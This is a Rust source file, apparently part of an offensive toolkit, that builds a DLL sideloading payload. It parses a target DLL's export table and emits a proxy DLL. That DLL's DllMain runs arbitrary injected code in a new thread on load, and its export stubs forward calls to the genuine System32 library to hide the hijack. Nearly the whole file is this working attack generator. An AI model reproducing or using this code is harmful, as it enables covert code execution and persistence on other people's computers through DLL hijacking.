#![allow(dead_code)]
use std::path::Path;

pub fn generate_sideload_source(target_dll_path: &Path, body: &str) -> anyhow::Result<String> {
    // Parse the target DLL to get export names
    let dll_bytes = std::fs::read(target_dll_path)
        .map_err(|e| anyhow::anyhow!("Failed to read target DLL '{}': {}", target_dll_path.display(), e))?;

    let exports = parse_dll_exports(&dll_bytes)?;
    let dll_filename = target_dll_path
        .file_name()
        .and_then(|f| f.to_str())
        .unwrap_or("original.dll");

    // Build the forwarded export stubs
    let mut export_stubs = String::new();
    for export in &exports {
        export_stubs.push_str(&format!(
            r#"
#[no_mangle]
pub unsafe extern "system" fn {name}() {{
    static ONCE: std::sync::Once = std::sync::Once::new();
    static mut REAL_FN: *const () = std::ptr::null();
    ONCE.call_once(|| {{
        use windows_sys::Win32::System::LibraryLoader::*;
        let dll_path: Vec<u16> = "C:\\Windows\\System32\\{dll_filename}"
            .encode_utf16().chain(std::iter::once(0)).collect();
        let real_dll = LoadLibraryW(dll_path.as_ptr());
        if !real_dll.is_null() {{
            let addr = GetProcAddress(real_dll, b"{name}\0".as_ptr());
            if let Some(f) = addr {{
                REAL_FN = f as *const ();
            }}
        }}
    }});
    if !REAL_FN.is_null() {{
        let real: extern "system" fn() = std::mem::transmute(REAL_FN);
        real();
    }}
}}
"#,
            name = export,
            dll_filename = dll_filename
        ));
    }

    let source = format!(
        r#"use std::ffi::c_void;

#[no_mangle]
pub unsafe extern "system" fn DllMain(
    _h_instance: *mut c_void,
    dw_reason: u32,
    _lp_reserved: *mut c_void,
) -> i32 {{
    if dw_reason == 1 {{ // DLL_PROCESS_ATTACH
        std::thread::spawn(|| {{
{body}
        }});
    }}
    1
}}
{export_stubs}"#,
        body = body,
        export_stubs = export_stubs
    );

    Ok(source)
}

fn parse_dll_exports(dll_bytes: &[u8]) -> anyhow::Result<Vec<String>> {
    if dll_bytes.len() < 64 {
        anyhow::bail!("DLL too small to parse");
    }

    // Parse DOS header
    let e_lfanew = u32::from_le_bytes([
        dll_bytes[0x3C], dll_bytes[0x3D], dll_bytes[0x3E], dll_bytes[0x3F],
    ]) as usize;

    if dll_bytes.len() < e_lfanew + 0x18 {
        anyhow::bail!("Invalid PE headers");
    }

    // Get optional header offset and size
    let optional_header_offset = e_lfanew + 4 + 20;

    // Export directory RVA is at optional_header + 112 (for PE32+)
    if dll_bytes.len() < optional_header_offset + 116 {
        anyhow::bail!("PE too small for export directory");
    }

    let export_rva = u32::from_le_bytes([
        dll_bytes[optional_header_offset + 112],
        dll_bytes[optional_header_offset + 113],
        dll_bytes[optional_header_offset + 114],
        dll_bytes[optional_header_offset + 115],
    ]) as usize;

    if export_rva == 0 {
        return Ok(Vec::new());
    }

    // Convert RVA to file offset (simplified - assumes first section covers exports)
    let file_header_offset = e_lfanew + 4;
    let num_sections = u16::from_le_bytes([
        dll_bytes[file_header_offset + 2], dll_bytes[file_header_offset + 3],
    ]) as usize;
    let optional_header_size = u16::from_le_bytes([
        dll_bytes[file_header_offset + 16], dll_bytes[file_header_offset + 17],
    ]) as usize;
    let sections_start = optional_header_offset + optional_header_size;

    let file_offset = rva_to_offset(dll_bytes, export_rva, sections_start, num_sections)
        .ok_or_else(|| anyhow::anyhow!("Cannot resolve export directory RVA"))?;

    if dll_bytes.len() < file_offset + 40 {
        return Ok(Vec::new());
    }

    // Parse export directory
    let num_names = u32::from_le_bytes([
        dll_bytes[file_offset + 24], dll_bytes[file_offset + 25],
        dll_bytes[file_offset + 26], dll_bytes[file_offset + 27],
    ]) as usize;
    let names_rva = u32::from_le_bytes([
        dll_bytes[file_offset + 32], dll_bytes[file_offset + 33],
        dll_bytes[file_offset + 34], dll_bytes[file_offset + 35],
    ]) as usize;

    let names_offset = rva_to_offset(dll_bytes, names_rva, sections_start, num_sections)
        .ok_or_else(|| anyhow::anyhow!("Cannot resolve names RVA"))?;

    let mut exports = Vec::new();
    for i in 0..num_names {
        let name_rva_offset = names_offset + i * 4;
        if name_rva_offset + 4 > dll_bytes.len() {
            break;
        }
        let name_rva = u32::from_le_bytes([
            dll_bytes[name_rva_offset],
            dll_bytes[name_rva_offset + 1],
            dll_bytes[name_rva_offset + 2],
            dll_bytes[name_rva_offset + 3],
        ]) as usize;

        let name_offset = match rva_to_offset(dll_bytes, name_rva, sections_start, num_sections) {
            Some(o) => o,
            None => continue,
        };

        let mut name = String::new();
        let mut pos = name_offset;
        while pos < dll_bytes.len() && dll_bytes[pos] != 0 {
            name.push(dll_bytes[pos] as char);
            pos += 1;
        }
        if !name.is_empty() {
            exports.push(name);
        }
    }

    Ok(exports)
}

fn rva_to_offset(
    dll_bytes: &[u8],
    rva: usize,
    sections_start: usize,
    num_sections: usize,
) -> Option<usize> {
    for i in 0..num_sections {
        let sec_offset = sections_start + i * 40;
        if sec_offset + 40 > dll_bytes.len() {
            break;
        }
        let virtual_address = u32::from_le_bytes([
            dll_bytes[sec_offset + 12], dll_bytes[sec_offset + 13],
            dll_bytes[sec_offset + 14], dll_bytes[sec_offset + 15],
        ]) as usize;
        let virtual_size = u32::from_le_bytes([
            dll_bytes[sec_offset + 8], dll_bytes[sec_offset + 9],
            dll_bytes[sec_offset + 10], dll_bytes[sec_offset + 11],
        ]) as usize;
        let raw_data_ptr = u32::from_le_bytes([
            dll_bytes[sec_offset + 20], dll_bytes[sec_offset + 21],
            dll_bytes[sec_offset + 22], dll_bytes[sec_offset + 23],
        ]) as usize;

        if rva >= virtual_address && rva < virtual_address + virtual_size {
            return Some(rva - virtual_address + raw_data_ptr);
        }
    }
    None
}
